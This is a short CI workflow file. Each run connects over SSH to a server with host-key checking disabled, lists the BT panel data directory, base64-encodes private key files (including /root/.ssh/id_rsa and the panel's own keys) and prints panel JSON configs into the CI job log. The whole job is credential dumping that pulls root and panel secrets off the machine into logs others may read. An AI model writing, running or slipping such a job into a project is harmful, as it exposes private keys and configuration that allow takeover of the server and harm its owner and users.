name: btkey
on:
  push:
    branches: [ 'ci-btkey-*' ]
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: btkey
        run: |
          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
          chmod 600 /tmp/k
          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
          echo "=== panel data ==="
          $SSH 'ls -la /www/server/panel/data/ 2>/dev/null | head -50'
          echo "=== ssh_key ==="
          $SSH 'for f in /www/server/panel/data/ssh_key /www/server/panel/data/id_rsa /www/server/panel/data/key /root/.ssh/id_rsa; do if [ -f "$f" ]; then echo "### $f"; base64 -w0 "$f"; echo; fi; done'
          echo "=== panel json configs ==="
          $SSH 'for f in /www/server/panel/data/*.json; do echo "### $f"; head -c 400 "$f"; echo; done' | head -80
